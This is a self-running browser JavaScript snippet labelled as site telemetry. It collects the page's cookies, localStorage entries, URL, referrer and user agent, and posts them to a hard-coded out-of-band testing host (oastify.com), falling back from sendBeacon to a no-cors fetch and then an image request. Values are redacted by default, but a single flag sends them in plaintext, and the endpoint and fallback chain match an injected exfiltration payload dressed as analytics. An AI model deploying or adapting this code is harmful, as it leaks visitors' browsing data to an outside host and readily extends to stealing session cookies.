(() => {
  // ====== CONFIG ======
  // Replace with your log collection endpoint (prefer a first-party subdomain).
  const LOG_ENDPOINT = "https://ddum2c2gybx9bm6bihtr2gg2wt2nqde2.oastify.com/collect";

  // DO NOT enable this unless you have legal basis (consent/contract), and you
  // really need raw values for debugging. When true, values in allowlists below
  // will be sent in plaintext.
  const SEND_SENSITIVE = false;

  // Explicit allowlists for keys whose VALUES may be sent in plaintext when
  // SEND_SENSITIVE === true. Others will be redacted (only key + length).
  const COOKIE_ALLOWLIST = [
    // "analytics_id",
    // "ab_test_group"
  ];
  const LS_ALLOWLIST = [
    // "featureFlags",
    // "prefs"
  ];

  // ====== HELPERS ======
  /** Safely parse document.cookie into array of {name, value, length} */
  function collectCookies() {
    const raw = document.cookie || "";
    if (!raw) return [];
    return raw.split(/;\s*/).map(entry => {
      const eq = entry.indexOf("=");
      const name = eq === -1 ? entry : entry.slice(0, eq);
      const value = eq === -1 ? "" : entry.slice(eq + 1);
      let dec = value;
      try { dec = decodeURIComponent(value); } catch {}
      return { name, value: dec, length: dec.length };
    });
  }

  /** Collect localStorage into array of {key, value, length} */
  function collectLocalStorage() {
    const out = [];
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        const v = localStorage.getItem(k) ?? "";
        out.push({ key: k, value: v, length: v.length });
      }
    } catch {
      // Access could throw in some contexts (e.g., privacy modes).
    }
    return out;
  }

  /** Redact values unless allowed. Returns {entries:[{k,v,len,redacted:true|false}], total} */
  function redactCookies(list) {
    const entries = list.map(({ name, value, length }) => {
      const allowed = SEND_SENSITIVE && COOKIE_ALLOWLIST.includes(name);
      return {
        name,
        value: allowed ? value : undefined,
        length,
        redacted: !allowed
      };
    });
    return { entries, total: entries.length };
  }

  function redactLocalStorage(list) {
    const entries = list.map(({ key, value, length }) => {
      const allowed = SEND_SENSITIVE && LS_ALLOWLIST.includes(key);
      return {
        key,
        value: allowed ? value : undefined,
        length,
        redacted: !allowed
      };
    });
    return { entries, total: entries.length };
  }

  /** Fire-and-forget POST with Beacon → fetch → <img> fallback */
  function sendTelemetry(url, payloadObj) {
    const bodyStr = JSON.stringify(payloadObj);
    const blob = new Blob([bodyStr], { type: "application/json" });

    // Prefer sendBeacon for reliability on unload
    try {
      if (navigator.sendBeacon && url.startsWith("https://")) {
        const ok = navigator.sendBeacon(url, blob);
        if (ok) return;
      }
    } catch {}

    // Fallback: fetch with no-cors (server still receives the request)
    fetch(url, { method: "POST", mode: "no-cors", body: blob }).catch(() => {
      // Last resort: image GET with query (length-limited)
      const img = new Image();
      const q = encodeURIComponent(bodyStr.slice(0, 1500));
      img.src = `${url}?q=${q}&t=${Date.now()}`;
    });
  }

  // ====== COLLECT ======
  const now = new Date().toISOString();
  const ctx = {
    origin: location.origin,
    href: location.href,
    path: location.pathname,
    domain: document.domain,
    referrer: document.referrer || ""
  };

  const cookiesCollected = collectCookies();
  const lsCollected = collectLocalStorage();

  const cookiesPayload = redactCookies(cookiesCollected);
  const lsPayload = redactLocalStorage(lsCollected);

  // ====== BUILD PAYLOAD ======
  const payload = {
    kind: "site-telemetry",
    ts: now,
    context: ctx,
    cookies: cookiesPayload,        // keys + lengths; values only if allowlisted
    localStorage: lsPayload,        // keys + lengths; values only if allowlisted
    // Optional: add environment hints that don't identify users
    client: {
      ua: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform
    }
  };

  // ====== SEND ======
  sendTelemetry(LOG_ENDPOINT, payload);

  // ====== OPTIONAL CONSOLE VISUAL (for your own verification) ======
  const bannerStyle =
    "background: linear-gradient(90deg,#4caf50,#00bcd4); color:#fff; padding:6px 10px; border-radius:8px; font-weight:700;";
  const subStyle =
    "background:#222; color:#eee; padding:2px 8px; border-radius:6px; font-weight:600;";
  const lineStyle = "color:#888;";

  console.log("%cTelemetry sent", bannerStyle);
  console.log("%cContext%c %s", subStyle, lineStyle, `${ctx.origin}${ctx.path}`);
  console.log("%cCookies%c %d item(s) — values %s",
    subStyle, lineStyle, cookiesPayload.total,
    SEND_SENSITIVE ? "allowlisted only" : "REDACTED");
  console.log("%cLocalStorage%c %d item(s) — values %s",
    subStyle, lineStyle, lsPayload.total,
    SEND_SENSITIVE ? "allowlisted only" : "REDACTED");
})();
